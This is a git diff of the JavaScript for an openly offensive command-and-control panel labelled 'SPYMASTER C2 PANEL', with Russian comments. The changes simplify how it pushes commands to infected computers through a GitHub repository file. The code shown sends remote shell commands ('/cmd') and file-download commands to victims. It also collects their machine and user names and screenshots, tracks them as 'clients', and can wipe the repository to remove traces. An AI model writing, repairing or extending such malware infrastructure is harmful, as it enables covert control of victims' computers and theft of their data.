@@ -1,4 +1,4 @@
-// ============= SPYMASTER C2 PANEL - РАБОЧАЯ ВЕРСИЯ (ВСЕ КНОПКИ) =============
+// ============= SPYMASTER C2 PANEL - ПРОСТАЯ РАБОЧАЯ ВЕРСИЯ =============
 // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
 
 // ============= КОНФИГУРАЦИЯ =============
@@ -80,31 +80,7 @@ function showNotification(message, type = "info") {
     setTimeout(() => notification.remove(), 3000);
 }
 
-function showSendingIndicator(show) {
-    let indicator = document.getElementById("sendingIndicator");
-    if (!indicator) {
-        indicator = document.createElement("div");
-        indicator.id = "sendingIndicator";
-        indicator.style.cssText = `
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: #ff8800;
-            color: #fff;
-            padding: 8px 15px;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 12px;
-            z-index: 1000;
-            display: none;
-        `;
-        indicator.innerHTML = "⏳ ОТПРАВКА...";
-        document.body.appendChild(indicator);
-    }
-    indicator.style.display = show ? "block" : "none";
-}
-
-// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ КОМАНД =============
+// ============= ПРОСТАЯ ОТПРАВКА КОМАНД (РАБОТАЛА ИДЕАЛЬНО) =============
 async function sendCommand(command, clientId = null) {
     if (!command) return;
     
@@ -115,15 +91,10 @@ async function sendCommand(command, clientId = null) {
     }
     
     addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
-    showSendingIndicator(true);
     
     try {
-        const cacheBuster = `?t=${Date.now()}&_=${Math.random()}`;
-        
-        let response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
-            headers: HEADERS,
-            cache: 'no-store'
-        });
+        // 1. Получаем текущий commands.txt
+        let response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
         
         let currentContent = "";
         let sha = null;
@@ -132,17 +103,13 @@ async function sendCommand(command, clientId = null) {
             const data = await response.json();
             currentContent = atob(data.content);
             sha = data.sha;
-        } else if (response.status === 404) {
-            addLog(`📝 СОЗДАЮ commands.txt...`, "system");
-        } else {
-            addLog(`❌ ОШИБКА: ${response.status}`, "error");
-            showSendingIndicator(false);
-            return;
         }
         
-        const newContent = currentContent + finalCommand + " #" + Date.now() + "\n";
+        // 2. Добавляем команду (БЕЗ ВСЯКИХ ВРЕМЕННЫХ МЕТОК!)
+        const newContent = currentContent + finalCommand + "\n";
         const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
         
+        // 3. Отправляем обратно
         const putData = {
             message: `Command: ${command}`,
             content: encodedContent,
@@ -150,54 +117,28 @@ async function sendCommand(command, clientId = null) {
         };
         if (sha) putData.sha = sha;
         
-        let success = false;
-        for (let attempt = 1; attempt <= 3; attempt++) {
-            try {
-                const putResponse = await fetch(`${API_URL}/commands.txt`, {
-                    method: "PUT",
-                    headers: HEADERS,
-                    body: JSON.stringify(putData)
-                });
-                
-                if (putResponse.status === 200 || putResponse.status === 201) {
-                    addLog(`✅ ОТПРАВЛЕНО! (${attempt})`, "success");
-                    showNotification(`✅ ${command}`, "success");
-                    success = true;
-                    break;
-                } else if (putResponse.status === 409) {
-                    addLog(`⚠️ КОНФЛИКТ, ПОВТОР... (${attempt})`, "warning");
-                    const freshResponse = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
-                        headers: HEADERS,
-                        cache: 'no-store'
-                    });
-                    if (freshResponse.status === 200) {
-                        const freshData = await freshResponse.json();
-                        putData.sha = freshData.sha;
-                        continue;
-                    }
-                }
-            } catch (err) {
-                addLog(`⚠️ ОШИБКА: ${err.message} (${attempt})`, "error");
-            }
-            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
-        }
+        const putResponse = await fetch(`${API_URL}/commands.txt`, {
+            method: "PUT",
+            headers: HEADERS,
+            body: JSON.stringify(putData)
+        });
         
-        if (!success) {
-            addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ`, "error");
+        if (putResponse.status === 200 || putResponse.status === 201) {
+            addLog(`✅ ОТПРАВЛЕНО: ${command}`, "success");
+            showNotification(`✅ ${command}`, "success");
+        } else {
+            addLog(`❌ ОШИБКА: ${putResponse.status}`, "error");
         }
         
     } catch (error) {
         addLog(`❌ ОШИБКА: ${error.message}`, "error");
     }
-    
-    showSendingIndicator(false);
 }
 
 // ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
 async function loadResults() {
     try {
-        const cacheBuster = `?t=${Date.now()}`;
-        const response = await fetch(`${API_URL}${cacheBuster}`, { headers: HEADERS });
+        const response = await fetch(API_URL, { headers: HEADERS });
         if (!response.ok) return;
         
         const files = await response.json();
@@ -213,16 +154,18 @@ async function loadResults() {
         if (screensCount) screensCount.innerText = screenshots.length;
         if (clientsCount) clientsCount.innerText = clients.length;
         
+        // Новые результаты
         for (const file of results) {
             if (!seenFiles.includes(file.name)) {
                 seenFiles.push(file.name);
-                const content = await fetch(file.download_url + cacheBuster).then(r => r.text());
+                const content = await fetch(file.download_url).then(r => r.text());
                 addLog(`📥 ${file.name}`, "result");
                 const lines = content.split('\n').slice(0, 5);
                 for (const line of lines) {
                     if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
                 }
                 
+                // Новый клиент?
                 if (content.includes("PC:")) {
                     const pcMatch = content.match(/PC:\s*([^\n]+)/);
                     const userMatch = content.match(/User:\s*([^\n]+)/);
@@ -234,11 +177,13 @@ async function loadResults() {
                         });
                         updateClientsList();
                         addLog(`💻 НОВЫЙ КЛИЕНТ: ${pcMatch[1]}`, "client");
+                        showNotification(`Новый клиент: ${pcMatch[1]}`, "success");
                     }
                 }
             }
         }
         
+        // Скриншоты
         const grid = document.getElementById("screensGrid");
         if (grid && screenshots.length > 0) {
             grid.innerHTML = "";
@@ -246,7 +191,7 @@ async function loadResults() {
                 const card = document.createElement("div");
                 card.className = "screenshot-card";
                 card.onclick = () => window.open(shot.download_url, '_blank');
-                card.innerHTML = `<img src="${shot.download_url}${cacheBuster}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
+                card.innerHTML = `<img src="${shot.download_url}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
                 grid.appendChild(card);
             }
         }
@@ -267,20 +212,18 @@ function updateClientsList() {
 
 async function clearCommands() {
     try {
-        const cacheBuster = `?t=${Date.now()}`;
-        const response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, { headers: HEADERS });
+        const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
         if (response.status === 200) {
             const data = await response.json();
-            const deleteData = {
-                message: "Clear commands",
-                content: btoa(""),
-                sha: data.sha,
-                branch: "main"
-            };
             await fetch(`${API_URL}/commands.txt`, {
                 method: "PUT",
                 headers: HEADERS,
-                body: JSON.stringify(deleteData)
+                body: JSON.stringify({
+                    message: "Clear commands",
+                    content: btoa(""),
+                    sha: data.sha,
+                    branch: "main"
+                })
             });
             addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
         }
@@ -313,16 +256,16 @@ async function testConnection() {
 
 function startAutoRefresh() {
     if (autoRefresh) clearInterval(autoRefresh);
-    autoRefresh = setInterval(() => loadResults(), 8000);
-    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО", "system");
+    autoRefresh = setInterval(() => loadResults(), 5000);
+    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system");
 }
 
 // ============= ИНИЦИАЛИЗАЦИЯ =============
 function init() {
-    addLog("🐀 SPYMASTER C2 PANEL v5.0", "system");
+    addLog("🐀 SPYMASTER C2 PANEL v1.0", "system");
     addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
     
-    // Добавляем стили
+    // Стили
     if (!document.querySelector("#dynamic-styles")) {
         const style = document.createElement('style');
         style.id = "dynamic-styles";
@@ -344,102 +287,66 @@ function init() {
     startAutoRefresh();
     loadResults();
     
-    // ============= ПРИВЯЗКА ВСЕХ КНОПОК (ГЛАВНОЕ ИСПРАВЛЕНИЕ) =============
-    
-    // 1. Кнопки быстрых команд (.cmd-btn)
-    document.querySelectorAll('.cmd-btn').forEach(btn => {
-        btn.removeEventListener('click', btn._handler);
-        btn._handler = () => {
+    // Кнопки
+    document.querySelectorAll('.cmd-btn, .cmd-small').forEach(btn => {
+        btn.onclick = () => {
             const cmd = btn.getAttribute('data-cmd');
             if (cmd) sendCommand(cmd);
         };
-        btn.addEventListener('click', btn._handler);
     });
     
-    // 2. Маленькие кнопки (.cmd-small)
-    document.querySelectorAll('.cmd-small').forEach(btn => {
-        if (btn.id === 'sendCustomBtn' || btn.id === 'downloadBtn' || btn.id === 'shellBtn') return;
-        btn.removeEventListener('click', btn._handler);
-        btn._handler = () => {
-            const cmd = btn.getAttribute('data-cmd');
-            if (cmd) sendCommand(cmd);
-        };
-        btn.addEventListener('click', btn._handler);
-    });
-    
-    // 3. Кнопка отправки кастомной команды
-    const sendCustomBtn = document.getElementById('sendCustomBtn');
-    if (sendCustomBtn) {
-        sendCustomBtn.removeEventListener('click', sendCustomBtn._handler);
-        sendCustomBtn._handler = () => {
+    // Кастомная команда
+    const sendBtn = document.getElementById('sendCustomBtn');
+    if (sendBtn) {
+        sendBtn.onclick = () => {
             const input = document.getElementById('customCmd');
             if (input && input.value) {
                 sendCommand(input.value);
                 input.value = '';
             }
         };
-        sendCustomBtn.addEventListener('click', sendCustomBtn._handler);
     }
     
-    // 4. Кнопка Download
+    // Download
     const downloadBtn = document.getElementById('downloadBtn');
     if (downloadBtn) {
-        downloadBtn.removeEventListener('click', downloadBtn._handler);
-        downloadBtn._handler = () => {
+        downloadBtn.onclick = () => {
             const input = document.getElementById('downloadPath');
             if (input && input.value) {
                 sendCommand(`/download ${input.value}`);
             }
         };
-        downloadBtn.addEventListener('click', downloadBtn._handler);
     }
     
-    // 5. Кнопка Shell
+    // Shell
     const shellBtn = document.getElementById('shellBtn');
     if (shellBtn) {
-        shellBtn.removeEventListener('click', shellBtn._handler);
-        shellBtn._handler = () => {
+        shellBtn.onclick = () => {
             const input = document.getElementById('shellCmd');
             if (input && input.value) {
                 sendCommand(`/cmd ${input.value}`);
             }
         };
-        shellBtn.addEventListener('click', shellBtn._handler);
     }
     
-    // 6. Кнопка очистки команд
+    // Очистка команд
     const clearBtn = document.getElementById('clearCommandsBtn');
-    if (clearBtn) {
-        clearBtn.removeEventListener('click', clearBtn._handler);
-        clearBtn._handler = () => clearCommands();
-        clearBtn.addEventListener('click', clearBtn._handler);
-    }
+    if (clearBtn) clearBtn.onclick = () => clearCommands();
     
-    // 7. Кнопка обновления
+    // Обновление
     const refreshBtn = document.getElementById('refreshBtn');
-    if (refreshBtn) {
-        refreshBtn.removeEventListener('click', refreshBtn._handler);
-        refreshBtn._handler = () => {
-            loadResults();
-            addLog("🔄 ОБНОВЛЕНО", "system");
-        };
-        refreshBtn.addEventListener('click', refreshBtn._handler);
-    }
+    if (refreshBtn) refreshBtn.onclick = () => loadResults();
     
-    // 8. Кнопка очистки всего
+    // Очистка всего
     const clearAllBtn = document.getElementById('clearAllBtn');
     if (clearAllBtn) {
-        clearAllBtn.removeEventListener('click', clearAllBtn._handler);
-        clearAllBtn._handler = () => {
+        clearAllBtn.onclick = () => {
             if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
-                addLog("💣 ОЧИСТКА РЕПОЗИТОРИЯ...", "system");
-                // Функция очистки
                 (async () => {
-                    const response = await fetch(`${API_URL}?t=${Date.now()}`, { headers: HEADERS });
+                    const response = await fetch(API_URL, { headers: HEADERS });
                     if (response.ok) {
                         const files = await response.json();
                         const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
-                        let deleted = 0;
                         for (const file of files) {
                             if (protectedFiles.includes(file.name)) continue;
                             await fetch(`${API_URL}/${file.name}`, {
@@ -447,10 +354,8 @@ function init() {
                                 headers: HEADERS,
                                 body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
                             });
-                            deleted++;
-                            await new Promise(r => setTimeout(r, 100));
                         }
-                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
+                        addLog("💣 РЕПОЗИТОРИЙ ОЧИЩЕН", "success");
                         seenFiles = [];
                         clients = [];
                         loadResults();
@@ -458,35 +363,29 @@ function init() {
                 })();
             }
         };
-        clearAllBtn.addEventListener('click', clearAllBtn._handler);
     }
     
-    // 9. Выбор клиента
+    // Выбор клиента
     const clientSelect = document.getElementById('clientSelect');
     if (clientSelect) {
-        clientSelect.removeEventListener('change', clientSelect._handler);
-        clientSelect._handler = (e) => {
+        clientSelect.onchange = (e) => {
             currentClient = e.target.value;
             addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
         };
-        clientSelect.addEventListener('change', clientSelect._handler);
     }
     
-    // 10. Вкладки
+    // Вкладки
     document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.removeEventListener('click', btn._handler);
-        btn._handler = () => {
+        btn.onclick = () => {
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             btn.classList.add('active');
-            const tabId = `${btn.getAttribute('data-tab')}Tab`;
-            const tabContent = document.getElementById(tabId);
-            if (tabContent) tabContent.classList.add('active');
+            const tab = document.getElementById(`${btn.getAttribute('data-tab')}Tab`);
+            if (tab) tab.classList.add('active');
         };
-        btn.addEventListener('click', btn._handler);
     });
     
-    addLog("✅ ИНТЕРФЕЙС ЗАГРУЖЕН, ВСЕ КНОПКИ АКТИВНЫ", "success");
+    addLog("✅ ГОТОВ К РАБОТЕ", "success");
 }
 
 // Запуск
